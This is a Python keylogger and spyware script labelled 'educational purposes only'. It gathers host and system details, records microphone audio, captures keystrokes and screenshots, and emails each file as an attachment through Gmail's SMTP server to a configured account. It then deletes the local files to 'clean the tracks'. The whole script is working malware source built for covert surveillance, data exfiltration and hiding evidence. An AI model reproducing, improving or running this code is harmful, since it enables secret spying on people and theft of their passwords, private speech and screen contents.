#This is can be only used for educational purposes

#Required for getting hostname and IP Address
import socket

#Required for getting proccessor name,operating system and machine name
import platform

#Required for getting microphone input
import sounddevice as sd
from scipy.io.wavfile import write

# Required Native libraries of python for sending a mail to our gmail account
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

#Required for getting screenshot
import pyscreenshot as ImageGrab

#Required for getting key logs
from pynput.keyboard import Key, Listener

#Required for time
import time

#Required for deleting datas stored in the computer
import os

sys_inf = "sys.txt"
audio_inf = "mic.wav"
ss_inf = "ss.png"
keys_inf = "keylog.txt"

#change the location for your own will
extend = "\\"
stored =  " "

time_ite = 10
num_ite_total = 1
mic_time = 5

#email address and pass
email = " "
passw = ""


#######################################################


#sending the mail
def send(filename, attachment):
    froma = email
    to = email
    msg = MIMEMultipart()

    # storing the senders and receivers email address
    # both are our gmail address
    msg['From'] = froma
    msg['To'] = to

    # storing
    # content of mail
    msg['Subject'] = "Log File"
    body = "ContentOfMail"

    # attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))

    # open the file which to be sent
    filename = filename
    attachment = open(attachment, "rb")

    p = MIMEBase('application', 'octet-stream')

    # change payload into encoded
    # encoding
    p.set_payload((attachment).read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    # attach p to msg
    # creates smtp
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)

    # tls for security
    # login process
    s.starttls()
    s.login(froma, passw)

    # convert msg into a string
    # sending the mail
    text = msg.as_string()
    s.sendmail(froma, to, text)

    # ending the session
    s.quit()


#######################################################


# comp and network info
def comp_inf():
    with open(stored + extend+ sys_inf, "a") as f:

        host = socket.gethostname()
        IP = socket.gethostbyname(host)

        #writing Proccessor name,Operating system and Machine name in a text file
        f.write("Processor: " + (platform.processor() + "\n"))
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")

        #writing Hostname and IP in same text file
        f.write("Hostname: " + host + "\n")

        #uncomment the line to get IP
        #f.write("IP : " + IP + "\n")

comp_inf()
send(sys_inf, stored + extend + sys_inf)


#######################################################


def mic():
    #Sampling frequency
    fs = 44100

    #opening the microphone for selected seconds
    seconds = mic_time

    record = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(stored + extend + audio_inf, fs, record)


mic()
send(audio_inf, stored + extend + audio_inf)


#######################################################


# screenshot
def ss():

    im = ImageGrab.grab()
    im.save(stored + extend + ss_inf)

# Time controls for keylogger
num_ite = 0
current = time.time()
stopping = time.time() + time_ite


while num_ite < num_ite_total:

    count = 0
    keys = []

    counter = 0

    #######################################################

    def on_press(key):
        global keys, count, current

        print(key)
        keys.append(key)

        count += 1
        current = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    #######################################################

    def write_file(keys):
        with open(stored + extend + keys_inf, "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    #######################################################

    def on_release(key):
        if key == Key.esc:
            return False
        if current > stopping:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if current > stopping:

        # send contents to email
        # clear contents of log file.
        send(keys_inf, stored + extend + keys_inf)
        with open(stored + extend + keys_inf, "w") as f:
            f.write(" ")

        # take screenshot and send to email
        ss()
        send(ss_inf, stored + extend + ss_inf)

        # update  time
        num_ite += 1
        current = time.time()
        stopping = time.time() + time_ite

#before we delete files
#time.sleep(1)

# clean the tracks
deleteall = [sys_inf, audio_inf,ss_inf, keys_inf]
for file in deleteall:
    os.remove(stored + extend + file)